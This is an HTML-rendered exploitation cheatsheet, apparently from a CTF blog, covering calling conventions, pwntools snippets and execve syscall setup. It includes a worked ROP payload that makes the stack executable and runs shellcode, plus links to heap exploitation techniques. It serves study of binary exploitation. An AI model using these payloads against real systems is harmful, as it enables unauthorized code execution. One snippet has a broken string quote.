I"à<h1 id="cheatsheet">Cheatsheet</h1>
<h2 id="calling-convention">Calling Convention</h2>

<table>
  <thead>
    <tr>
      <th>Arch</th>
      <th>Registers</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Linux (x64)</td>
      <td><code class="language-plaintext highlighter-rouge">rdi, rsi, rdx, rcx, r8, r9</code></td>
    </tr>
    <tr>
      <td>Windows (x64)</td>
      <td><code class="language-plaintext highlighter-rouge">rcx, rdx, r8, r9</code></td>
    </tr>
  </tbody>
</table>

<h2 id="pwntools">pwntools</h2>

<table>
  <thead>
    <tr>
      <th>Item</th>
      <th>Code</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Shellcode</td>
      <td><code class="language-plaintext highlighter-rouge">shellcode = asm(shellcraft.sh())</code></td>
    </tr>
    <tr>
      <td>Strings</td>
      <td><code class="language-plaintext highlighter-rouge">binsh = libc.search('/bin/sh\x00;).next()</code></td>
    </tr>
    <tr>
      <td>Gadgets</td>
      <td><code class="language-plaintext highlighter-rouge">gadget = exe.search(asm('pop rdi; ret')).next()</code></td>
    </tr>
    <tr>
      <td>Address of Section</td>
      <td><code class="language-plaintext highlighter-rouge">data = exe.get_section_by_name('.data').header.sh_addr</code></td>
    </tr>
  </tbody>
</table>

<h2 id="ret2syscall">ret2syscall</h2>
<ul>
  <li><code class="language-plaintext highlighter-rouge">execve(/bin/sh)</code>
    <ul>
      <li>64-bit: <code class="language-plaintext highlighter-rouge">rax = 59, rdi = /bin/sh, rsi = 0, rdx = 0</code></li>
      <li>32-bit: <code class="language-plaintext highlighter-rouge">eax = 11, ebx = /bin/sh, ecx = 0, edx = 0</code></li>
    </ul>
  </li>
  <li><a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">Syscall Table</a></li>
</ul>

<h1 id="techniques">Techniques</h1>

<h2 id="rop">ROP</h2>

<h3 id="ret2stack-making-the-stack-executable">ret2stack: Making the stack executable</h3>
<ol>
  <li>Set value of <code class="language-plaintext highlighter-rouge">__stack_prot</code> to 7</li>
  <li>Call <code class="language-plaintext highlighter-rouge">_dl_make_stack_executable(__libc_stack_end, __stack_prot)</code></li>
  <li>Jump to shellcode</li>
</ol>

<p><strong>Example</strong></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">sh</span><span class="p">())</span>

<span class="n">_dl_make_stack_executable</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'_dl_make_stack_executable'</span><span class="p">]</span>
<span class="n">__stack_prot</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__stack_prot'</span><span class="p">]</span>
<span class="n">__libc_stack_end</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_stack_end'</span><span class="p">]</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">120</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000410ca3</span><span class="p">)</span> <span class="c1"># pop rsi ; ret
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">__stack_prot</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004163f4</span><span class="p">)</span> <span class="c1"># pop rax ; ret
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000047ff91</span><span class="p">)</span> <span class="c1"># mov qword ptr [rsi], rax ; ret
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400696</span><span class="p">)</span> <span class="c1"># pop rdi ; ret
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">__libc_stack_end</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">_dl_make_stack_executable</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000451974</span><span class="p">)</span> <span class="c1"># push rsp ; ret
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
</code></pre></div></div>

<h3 id="ret2csu"><a href="https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html?m=1">ret2csu</a></h3>

<ul>
  <li><a href="/ret2stack/">ret2stack</a>: Making the stack executable</li>
  <li><a href="https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html?m=1">ret2csu</a>: Lack of gadgets in 64-bit</li>
</ul>

<h2 id="heap">Heap</h2>
<ul>
  <li><a href="/House-of-Force/">House of Force</a>: Exploiting Top Chunk header to gain nearly-arbitrary write primitive</li>
  <li><a href="/Fastbin-Dupe/">Fastbin Dupe</a>: Tricking malloc into returning an already-allocated heap pointer by abusing the fastbin freelist.</li>
  <li><a href="/Unsafe-Unlink/">Unsafe Unlink</a>: Exploiting free on a corrupted chunk to get arbitrary write.</li>
</ul>
:ET